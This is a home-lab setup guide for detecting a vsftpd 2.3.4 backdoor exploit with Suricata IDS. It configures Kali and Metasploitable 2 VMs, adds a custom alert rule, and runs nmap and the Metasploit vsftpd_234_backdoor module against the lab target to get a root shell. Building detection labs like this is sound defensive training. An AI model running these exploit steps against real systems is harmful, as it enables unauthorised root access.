# 🔧 Setup Guide — Suricata IDS Home Lab

Complete step-by-step guide to replicate this home lab environment from scratch.

---

## 📋 Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| RAM | 8 GB | 16 GB |
| Storage | 50 GB | 100 GB |
| OS | Windows 10/11 or Linux | Windows 11 |
| VirtualBox | 7.x | Latest |

---

## 🖥️ Step 1: VirtualBox Setup

1. Download VirtualBox from: https://www.virtualbox.org/
2. Install with default settings
3. Launch VirtualBox Manager

---

## 🌐 Step 2: Host-Only Network Configure Karo

Before creating VMs, network setup karo:

```
VirtualBox → File → Host Network Manager → Create
```

Settings:
- **IPv4 Address:** 192.168.56.1
- **IPv4 Mask:** 255.255.255.0
- **DHCP Server:** Enable ✅

---

## 🐉 Step 3: Kali Linux VM Setup

### Download
- Download Kali Linux VirtualBox image: https://www.kali.org/get-kali/#kali-virtual-machines

### Import
```
VirtualBox → New → Import .ova file
```

### Network Settings
```
Kali VM → Settings → Network → Adapter 1
├── Enable Network Adapter: ✅
├── Attached to: Host-Only Adapter
├── Name: VirtualBox Host-Only Ethernet Adapter
└── Promiscuous Mode: Allow All
```

### Verify IP
```bash
ip a
# Should show: 192.168.56.102
```

---

## 💀 Step 4: Metasploitable 2 VM Setup

### Download
- Download from: https://sourceforge.net/projects/metasploitable/
- Extract the `.zip` file — you will get `Metasploitable.vmdk`

### Create VM in VirtualBox
```
VirtualBox → New
├── Name: Metasploitable2
├── OS: Linux
├── Distribution: Ubuntu
└── Version: Ubuntu (32-bit)
```

### Hardware Settings
```
System → Motherboard
└── Base Memory: 512 MB

Specify Virtual Hard Disk
└── Use an Existing Virtual Hard Disk File
    └── Select: Metasploitable.vmdk
```

### Network Settings
```
Metasploitable2 → Settings → Network → Adapter 1
├── Enable Network Adapter: ✅
├── Attached to: Host-Only Adapter
├── Name: VirtualBox Host-Only Ethernet Adapter
└── Promiscuous Mode: Allow All
```

### Login Credentials
```
Username: msfadmin
Password: msfadmin
```

### Verify IP
```bash
ifconfig
# Should show: 192.168.56.101
```

---

## 🛡️ Step 5: Suricata IDS Setup

### Installation (on Kali Linux)
```bash
sudo apt update
sudo apt install suricata -y
```

### Verify Installation
```bash
suricata --version
# Suricata version 8.0.4 RELEASE
```

### Configure Interface
```bash
sudo nano /etc/suricata/suricata.yaml
```

Find `af-packet` section and set:
```yaml
af-packet:
  - interface: eth0
```

### Add Custom Rules
```bash
sudo nano /etc/suricata/rules/local.rules
```

Add this rule:
```
alert tcp any any -> 192.168.56.101 21 (msg:"FTP Backdoor Attack Detected"; content:"USER"; sid:1000001; rev:1;)
```

### Add local.rules to suricata.yaml
```bash
sudo nano /etc/suricata/suricata.yaml
```

Find `rule-files` section:
```yaml
rule-files:
  - local.rules
```

### Start Suricata
```bash
sudo systemctl start suricata
sudo systemctl status suricata
# Should show: active (running) ✅
```

### Monitor Alerts Live
```bash
sudo tail -f /var/log/suricata/fast.log
```

---

## ⚔️ Step 6: Connectivity Test

From Kali Linux, ping Metasploitable:
```bash
ping 192.168.56.101
```

Expected output:
```
64 bytes from 192.168.56.101: icmp_seq=1 ttl=64 time=0.455 ms
4 packets transmitted, 4 received, 0% packet loss ✅
```

---

## 🔍 Step 7: Nmap Reconnaissance

```bash
nmap -sV 192.168.56.101
```

This will reveal 20+ open ports including the vulnerable vsftpd 2.3.4 service on port 21.

---

## 💥 Step 8: vsftpd 2.3.4 Exploit

Open **Terminal 2** and run Metasploit:
```bash
msfconsole
```

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.101
run
```

Expected output:
```
[+] Backdoor service has been spawned
[+] UID: uid=0(root) gid=0(root)
[*] Command shell session 1 opened ✅
```

---

## 🚨 Step 9: Verify Suricata Detection

Check **Terminal 1** (fast.log):
```bash
sudo tail -f /var/log/suricata/fast.log
```

Expected alert:
```
[**] [1:1000001:1] FTP Backdoor Attack Detected [**]
[Priority: 3] {TCP}
192.168.56.102:XXXXX → 192.168.56.101:21 ✅
```

---

## ✅ Lab Complete!

If you see the Suricata alert, your lab is fully working:

```
Kali (Attacker) ──exploit──▶ Metasploitable (Victim)
                                      ↑
                          Suricata detected the attack! 🛡️
```

---

## ⚠️ Important Notes

- **Never** expose Metasploitable2 to the internet
- Always use **Host-Only** network adapter
- This lab is strictly for **educational purposes**
- All testing must be done in **isolated environment only**

---

## 👤 Author

**Umang Srivastava**
🔗 [LinkedIn](https://linkedin.com/in/umangsrivastava220) | 🐙 [GitHub](https://github.com/umang220)
